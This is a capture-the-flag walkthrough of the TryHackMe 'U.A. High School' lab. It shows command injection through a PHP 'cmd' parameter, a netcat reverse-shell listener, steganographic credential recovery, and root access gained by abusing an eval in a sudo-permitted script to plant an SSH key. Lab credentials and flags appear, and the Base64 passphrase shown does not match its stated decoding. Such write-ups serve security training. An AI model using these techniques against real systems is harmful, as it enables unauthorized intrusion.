# 🏫 TryHackMe — U.A. High School

> **Web Enumeration | Parameter Discovery | Command Injection | Steganography | SSH | Sudo Abuse | SSH Key Injection**

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square&labelColor=555555)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-00a98f?style=flat-square&labelColor=555555)
![Vulnerability](https://img.shields.io/badge/Vulnerability-Command%20Injection-f06c2f?style=flat-square&labelColor=555555)
![Service](https://img.shields.io/badge/Service-HTTP%20%7C%20SSH-008cc1?style=flat-square&labelColor=555555)
![OS](https://img.shields.io/badge/OS-Ubuntu-e95420?style=flat-square&labelColor=555555)

---

### Attack Chain

```text
Web Application
      ↓
Directory Enumeration
      ↓
/assets/
      ↓
index.php
      ↓
Parameter Discovery
      ↓
cmd Parameter
      ↓
Command Injection
      ↓
www-data Shell
      ↓
Hidden_Content
      ↓
passphrase.txt
      ↓
Base64 Decoding
      ↓
Steganography Password
      ↓
oneforall.jpg
      ↓
Steghide Extraction
      ↓
deku Credentials
      ↓
SSH
      ↓
deku
      ↓
sudo -l
      ↓
feedback.sh
      ↓
eval() Command Injection
      ↓
Write SSH Key to /root/.ssh/authorized_keys
      ↓
SSH as root
      ↓
ROOT FLAG
```

---

# 🎯 Objectives

- Enumerate the web application.
- Discover hidden directories.
- Identify the `/assets/` directory.
- Enumerate PHP functionality.
- Discover the `cmd` parameter.
- Exploit command injection.
- Obtain a reverse shell as `www-data`.
- Enumerate the web server filesystem.
- Discover hidden content.
- Decode the Base64 passphrase.
- Extract hidden data from an image.
- Recover credentials.
- Obtain SSH access as `deku`.
- Enumerate sudo permissions.
- Analyze the privileged `feedback.sh` script.
- Identify unsafe use of `eval`.
- Exploit command injection through the feedback script.
- Add an SSH public key to the root account.
- Obtain a root shell.
- Retrieve both flags.

---


# 🌐 1. Initial Web Enumeration

I first accessed the target through the web server:

```text
http://10.48.175.107
```

The website displayed:

```text
U.A. High School - Beta
```

The page contained sections such as:

```text
ABOUT
COURSES
ADMISSIONS
CONTACT
```

<img width="1354" height="696" alt="1" src="https://github.com/user-attachments/assets/d6eb164c-53a9-4aff-823b-b3d57f2fa598" />

At this stage, the website appeared to be a relatively simple web application.

The next step was to perform directory enumeration.

---

# 🔎 2. Directory Enumeration

I used Gobuster to enumerate directories:

```bash
gobuster dir \
-u http://10.48.175.107 \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

The first command produced a wordlist-related error, so I corrected the wordlist path and continued enumeration against the discovered `/assets` directory.

The important result was:

```text
/ assets
```

Further enumeration of `/assets` produced:

```text
/images      301
/index.php   200
```

<img width="1274" height="754" alt="2" src="https://github.com/user-attachments/assets/4a441218-2efc-4105-9bb5-6d91995eb1c9" />

The `/assets/index.php` endpoint became the next interesting target.

---

# 📄 3. Investigating `index.php`

I accessed:

```text
http://10.48.175.107/assets/index.php
```

The page itself did not provide useful visible content.

<img width="1011" height="360" alt="3" src="https://github.com/user-attachments/assets/6994ba52-fb55-4173-9804-cdde7eda305b" />

This suggested that the endpoint might be processing parameters rather than simply serving a normal webpage.

---

# 🔍 4. Parameter Discovery

I used FFUF to discover parameters accepted by `index.php`:

```bash
ffuf \
-u http://10.48.175.107/assets/index.php?FUZZ=id \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-fs 0
```

The scan identified:

```text
cmd
```

The important finding was therefore:

```text
/assets/index.php?cmd=
```

<img width="1183" height="430" alt="4" src="https://github.com/user-attachments/assets/94383ec8-c1ab-4716-a7cd-26578f834a23" />

This was a significant discovery because a parameter named `cmd` strongly suggested that the application might execute operating-system commands.

---

# 💥 5. Command Injection

I tested the discovered parameter:

```text
http://10.48.175.107/assets/index.php?cmd=id
```

The response contained output similar to:

```text
uid=33(www-data)
gid=33(www-data)
groups=33(www-data)
```

This confirmed that the application was executing the supplied command on the server.

The command was being executed with the privileges of:

```text
www-data
```

<img width="1716" height="297" alt="5" src="https://github.com/user-attachments/assets/9e461404-2247-4660-89d0-384e6c40ca8a" />

---

# 🐚 6. Obtaining a Reverse Shell

Since arbitrary commands could be executed through the `cmd` parameter, I used it to establish a reverse shell.

On my Kali machine, I started a listener:

```bash
nc -lvnp 4848
```

I then triggered the reverse shell through the vulnerable parameter.

After the connection was received, I upgraded the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The resulting shell was:

```text
www-data@ip-10-48-175-107
```

<img width="1134" height="543" alt="6" src="https://github.com/user-attachments/assets/778cb604-9210-4fe5-86f3-6a4a72e7c9e0" />

At this point, I had initial access to the target as:

```text
www-data
```

---

# 🧪 7. Confirming Command Execution

The PHP source code later confirmed why the vulnerability existed.

The `index.php` file contained:

```php
<?php

$value = " ";

session_start();

if (isset($_GET['cmd'])){

    $value = shell_exec($_GET['cmd']);
    echo base64_encode($value);

}

?>
```

<img width="562" height="373" alt="7" src="https://github.com/user-attachments/assets/eb6d41f7-e0e5-4b49-9691-f7caea6c7c0a" />

The vulnerable line was:

```php
$value = shell_exec($_GET['cmd']);
```

User-controlled input from:

```text
$_GET['cmd']
```

was directly passed to:

```text
shell_exec()
```

without any proper validation or sanitization.

### Vulnerable Data Flow

```text
HTTP Request
     ↓
?cmd=<attacker input>
     ↓
$_GET['cmd']
     ↓
shell_exec()
     ↓
Operating System
```

This resulted in arbitrary command execution as `www-data`.

---

# 🔍 8. Enumerating the Web Application

I inspected the application directory:

```bash
cd /var/www/html/assets
ls
```

The directory contained:

```text
images
index.php
styles.css
```

I inspected the `images` directory:

```bash
cd images
ls
```

The important file was:

```text
oneforall.jpg
```
---

# 🔎 9. Searching for Hidden Content

I moved up through the web directory:

```bash
cd ..
cd ..
ls
```

The `/var/www` directory contained:

```text
Hidden_Content
html
```

The `Hidden_Content` directory was particularly interesting.

```bash
cd Hidden_Content
ls
```

Inside it was:

```text
passphrase.txt
```

---

# 🔐 10. Investigating `passphrase.txt`

I read the file:

```bash
cat passphrase.txt
```

It contained a Base64-looking string:

```text
QWxsQW1HRGb3JFdmVyISEhCg==
```

I decoded it using:

```bash
echo "QWxsQW1HRGb3JFdmVyISEhCg==" | base64 --decode
```

The decoded value was:

```text
AllMightForEver!!!
```

<img width="853" height="349" alt="10" src="https://github.com/user-attachments/assets/2d05cecf-f7aa-4cb6-a44d-26702d4ba557" />

This appeared to be a passphrase rather than a normal password.

The next step was to determine where this passphrase could be used.

---

# 🖼️ 11. Investigating `oneforall.jpg`

The image discovered earlier was:

```text
/var/www/html/assets/images/oneforall.jpg
```

I downloaded the image to my Kali machine:

```bash
wget http://10.48.175.107/assets/images/oneforall.jpg
```

I verified the file:

```bash
file oneforall.jpg
```

The output identified it as a JPEG image.

I also inspected the file contents:

```bash
xxd oneforall.jpg | head
```

<img width="732" height="525" alt="8" src="https://github.com/user-attachments/assets/42ef6f52-ac67-4b49-bdfc-d221257535e9" />

<img width="548" height="186" alt="9-1" src="https://github.com/user-attachments/assets/dce92e14-255f-41c9-aa22-ee625243e5a8" />

<img width="1169" height="141" alt="9-2" src="https://github.com/user-attachments/assets/e3ef2999-43cb-4da3-9722-47e21af38ff6" />

The file was a valid JPEG, so I investigated whether hidden data had been embedded inside it.

---

# 🕵️ 12. Steganography

I used `steghide` to attempt extraction:

```bash
steghide extract -sf oneforall.jpg
```

The tool requested a passphrase:

```text
Enter passphrase:
```

The passphrase recovered earlier was:

```text
AllMightForEver!!!
```

Using that passphrase successfully extracted:

```text
creds.txt
```

<img width="982" height="186" alt="11" src="https://github.com/user-attachments/assets/afab91a4-518b-4c1e-a85a-f51dc687d4a2" />

---

# 🔑 13. Recovering Credentials

I read the extracted file:

```bash
cat creds.txt
```

The file contained credentials for the user:

```text
deku:One?For?All_!!one1/A
```

The message in the file indicated that these were account credentials.

Therefore, I now had:

```text
Username: deku
Password: One?For?All_!!one1/A
```

---

# 🔐 14. SSH Access

The target exposed SSH on port 22, so I attempted to authenticate as `deku`:

```bash
ssh deku@10.48.175.107
```

I supplied the recovered password:

```text
One?For?All_!!one1/A
```

The authentication succeeded.

I obtained a shell as:

```text
deku
```

<img width="746" height="704" alt="12" src="https://github.com/user-attachments/assets/16b34f16-e918-4134-a744-4950c0a5a24d" />

---

# 🏠 15. User Flag

After logging in, I checked the home directory:

```bash
ls
```

The directory contained:

```text
user.txt
```

I retrieved the flag:

```bash
cat user.txt
```

The user flag was:

```text
THM{W3lc0m3_D3kU_1n_03r0rAll?}
```

<img width="440" height="180" alt="17" src="https://github.com/user-attachments/assets/07e9061c-3e45-4319-8d32-bf23ad2ed23c" />

---

# 🔐 16. Sudo Enumeration

With access as `deku`, I checked the available sudo permissions:

```bash
sudo -l
```

The output showed:

```text
User deku may run the following commands:

(ALL) /opt/NewComponent/feedback.sh
```

This meant that `deku` could execute:

```text
/opt/NewComponent/feedback.sh
```

with elevated privileges.

<img width="1228" height="492" alt="13" src="https://github.com/user-attachments/assets/bbb20b6a-7254-46d0-8a58-c5ad07fab3bf" />

---

# 📜 17. Analyzing `feedback.sh`

I inspected the script:

```bash
cat /opt/NewComponent/feedback.sh
```

The script contained:

```bash
#!/bin/bash

echo "Hello, Welcome to the Report Form"
echo "This is a way to report various problems"
echo "        Developed By"
echo "            The Technical Department of U.A."

echo "Enter your feedback:"
read feedback

if [[ "$feedback" != *\"* && "$feedback" != *\`* && "$feedback" != *\$(\`* && "$feedback" != *\|* && "$feedback" != *\>* && "$feedback" != *\&* && "$feedback" != *\;* && "$feedback" != *\?* && "$feedback" != *\!* && "$feedback" != *\"* ]]; then

    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."

else

    echo "Invalid input. Please provide a valid input."

fi
```

The most important line was:

```bash
eval "echo $feedback"
```

---

# 💣 18. Why `eval` Is Dangerous

`eval` takes a string and asks the shell to interpret it as a command.

The intended behavior was:

```text
User Input
    ↓
echo <feedback>
    ↓
Save feedback
```

However, because the input was passed to:

```bash
eval
```

shell metacharacters could potentially cause additional commands or shell redirections to be interpreted.

This is dangerous because the script was executable through:

```bash
sudo
```

Therefore:

```text
deku
   ↓
sudo
   ↓
feedback.sh
   ↓
eval
   ↓
shell command execution
   ↓
root privileges
```

---

# 🧪 19. Testing Command Injection

I first tested whether shell redirection could be processed.

The feedback input was:

```text
tmp > /tmp/test.txt
```

The script accepted the input and created the file:

```text
/tmp/test.txt
```

<img width="768" height="303" alt="14" src="https://github.com/user-attachments/assets/1ea0d4ce-163a-45db-821c-9424ff373314" />

This confirmed that shell interpretation was occurring inside the privileged script.

---

# 🔑 20. Generating an SSH Key

Instead of attempting to obtain an interactive shell directly, I generated an SSH key pair on my Kali machine:

```bash
ssh-keygen -t rsa
```

This created:

```text
id_rsa
id_rsa.pub
```

I restricted the private-key permissions:

```bash
chmod 600 id_rsa
```

The public key was stored in:

```text
id_rsa.pub
```

<img width="1223" height="594" alt="15-1" src="https://github.com/user-attachments/assets/0ea4a963-4141-4432-8033-c13ce99af459" />

---

# 🚨 21. Injecting the SSH Public Key

Because the privileged script executed user-controlled input through `eval`, I used shell redirection to place my public SSH key into the root account's authorized keys file.

The target file was:

```text
/root/.ssh/authorized_keys
```

The objective was:

```text
Kali public key
       ↓
/root/.ssh/authorized_keys
       ↓
Root trusts our SSH key
       ↓
SSH authentication
       ↓
root shell
```

The payload caused the script, running with elevated privileges, to write the public key to:

```text
/root/.ssh/authorized_keys
```

<img width="1229" height="214" alt="15-2" src="https://github.com/user-attachments/assets/8dc8c680-e67e-474c-adb8-4b05a60bcbb9" />

---

# 👑 22. SSH as Root

After the public key had been written, I connected to the machine using the corresponding private key:

```bash
ssh -i id_rsa root@10.48.175.107
```

The SSH authentication succeeded.

I verified my privileges:

```bash
id
```

The output showed:

```text
uid=0(root)
gid=0(root)
groups=0(root)
```

This confirmed complete root access.

<img width="1015" height="682" alt="16" src="https://github.com/user-attachments/assets/2edd7b70-09bd-4eee-8025-31c12db5070a" />

---

# 🚩 23. Root Flag

I navigated to the root directory:

```bash
cd /root
ls
```

The flag file was:

```text
root.txt
```

I retrieved it with:

```bash
cat root.txt
```

The root flag was:

```text
THM{Y0U_4r3_7h3_NUm83r_1_H3r0}
```

<img width="735" height="301" alt="18" src="https://github.com/user-attachments/assets/b543d71b-d16a-4e39-8115-9844d95d4742" />
